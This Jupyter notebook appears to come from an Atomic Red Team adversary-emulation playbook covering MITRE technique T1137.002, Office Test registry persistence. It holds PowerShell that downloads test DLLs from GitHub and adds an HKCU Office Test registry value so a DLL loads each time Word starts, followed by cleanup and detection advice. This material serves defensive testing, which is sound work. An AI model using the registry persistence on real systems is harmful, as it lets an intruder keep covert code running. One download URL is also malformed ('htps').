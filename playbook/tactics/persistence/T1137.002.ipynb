{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "f16c9a2d",
   "metadata": {},
   "source": "# T1137.002 - Office Test\nAdversaries may abuse the Microsoft Office \"Office Test\" Registry key to obtain persistence on a compromised system. An Office Test Registry location exists that allows a user to specify an arbitrary DLL that will be executed every time an Office application is started. This Registry key is thought to be used by Microsoft to load DLLs for testing and debugging purposes while developing Office applications. This Registry key is not created by default during an Office installation.(Citation: Hexacorn Office Test)(Citation: Palo Alto Office Test Sofacy)\n\nThere exist user and global Registry keys for the Office Test feature:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\Special\\Perf</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Office test\\Special\\Perf</code>\n\nAdversaries may add this Registry key and specify a malicious DLL that will be executed whenever an Office application, such as Word or Excel, is started."
  },
  {
   "cell_type": "markdown",
   "id": "39144f42",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "f88869fe",
   "metadata": {},
   "source": "### Atomic Test #1 - Office Application Startup Test Persistence (HKCU)\nOffice Test Registry location exists that allows a user to specify an arbitrary DLL that will be executed every time an Office\napplication is started. Key is used for debugging purposes. Not created by default & exist in HKCU & HKLM hives.\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: Microsoft Word must be installed\n\n##### Check Prereq Commands:\n```powershell\ntry {\n  New-Object -COMObject \"Word.Application\" | Out-Null\n  Stop-Process -Name \"winword\"\n  exit 0\n} catch { exit 1 }\n\n```\n##### Get Prereq Commands:\n```powershell\nWrite-Host \"You will need to install Microsoft Word manually to meet this requirement\"\n\n```\n##### Description: DLL files must exist on disk at specified location\n##### Check Prereq Commands:\n```powershell\nif ((Test-Path \"PathToAtomicsFolder\\T1137.002\\bin\\officetest_x64.dll\") -and (Test-Path \"PathToAtomicsFolder\\T1137.002\\bin\\officetest_x86.dll\")) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory \"PathToAtomicsFolder\\T1137.002\\bin\\\" -Force | Out-Null\nInvoke-Webrequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.002/bin/officetest_x64.dll\" -UseBasicParsing -OutFile \"PathToAtomicsFolder\\T1137.002\\bin\\officetest_x64.dll\"\nInvoke-Webrequest -Uri \"htps://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.002/bin/officetest_x86.dll\" -UseBasicParsing -OutFile \"PathToAtomicsFolder\\T1137.002\\bin\\officetest_x86.dll\"\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "83aba52f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1137.002 -TestNumbers 1 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "1072f0ba",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$wdApp = New-Object -COMObject \"Word.Application\"\nif(-not $wdApp.path.contains(\"Program Files (x86)\"))  \n{\n  Write-Host \"64-bit Office\"\n  reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\Special\\Perf\" /t REG_SZ /d \"PathToAtomicsFolder\\T1137.002\\bin\\officetest_x64.dll\" /f       \n}\nelse{\n  Write-Host \"32-bit Office\"\n  reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\Special\\Perf\" /t REG_SZ /d \"PathToAtomicsFolder\\T1137.002\\bin\\officetest_x86.dll\" /f\n}\nStop-Process -Name \"WinWord\" \nStart-Process \"WinWord\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1e7ac7a6",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1137.002 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "2bbbacb8",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nStop-Process -Name \"notepad\",\"WinWord\" -ErrorAction Ignore\nRemove-Item \"HKCU:\\Software\\Microsoft\\Office test\\Special\\Perf\" -ErrorAction Ignore```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c1f72ecc",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1137.002 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "3d4643d2",
   "metadata": {},
   "source": "## Detection\nMonitor for the creation of the Office Test Registry key. Many Office-related persistence mechanisms require changes to the Registry and for binaries, files, or scripts to be written to disk or existing files modified to include malicious scripts. Collect events related to Registry key creation and modification for keys that could be used for Office-based persistence. Since v13.52, Autoruns can detect tasks set up using the Office Test Registry key.(Citation: Palo Alto Office Test Sofacy)\n\nConsider monitoring Office processes for anomalous DLL loads."
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}